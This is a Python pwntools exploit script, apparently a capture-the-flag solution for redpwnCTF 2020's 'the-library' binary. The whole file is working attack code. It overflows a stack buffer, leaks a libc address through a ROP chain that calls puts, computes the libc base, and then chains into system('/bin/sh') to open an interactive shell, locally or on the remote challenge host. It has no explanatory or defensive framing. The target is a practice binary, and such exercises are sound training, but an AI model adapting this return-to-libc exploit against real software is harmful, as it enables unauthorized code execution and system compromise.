#!/usr/bin/env python2
from pwn import *
import sys
context(os="linux", arch="amd64")
context.terminal = ['zsh', '-e', 'sh', '-c']

LOCAL = True

HOST = "2020.redpwnc.tf"
PORT = 31350


def exploit(r):

    libc = ELF('/usr/lib/libc.so.6')
    #libc = ELF('./libc.so.6')
    e = ELF('./the-library')
    rop = ROP('./the-library')

    # Leak libc
    PUTS = e.plt['puts']
    LIBC_START_MAIN = e.symbols['__libc_start_main']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    MAIN = e.symbols['main']

    log.info("puts@plt: " + hex(PUTS))
    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
    log.info("pop rdi gadget: " + hex(POP_RDI))

    payload = '\x90' * 24
    rops = payload + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(MAIN)

    r.recvuntil("Welcome to the library... What's your name?")
    print(r.sendline(rops))
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())

    recieved = r.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

    libc.address = leak - libc.sym["__libc_start_main"]
    log.info("Address of libc %s " % hex(libc.address))

    rop = ROP(libc)
    rop.system(next(libc.search('/bin/sh\x00')))
    print(rop.dump())

    payload = '\x90' * 24 + rop.chain()

    r.recvuntil("Welcome to the library... What's your name?")
    print(r.sendline(payload))
    r.interactive()
    return


if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process("./the-library")
        #print (util.proc.pidof(r))
        #pause()
        exploit(r)
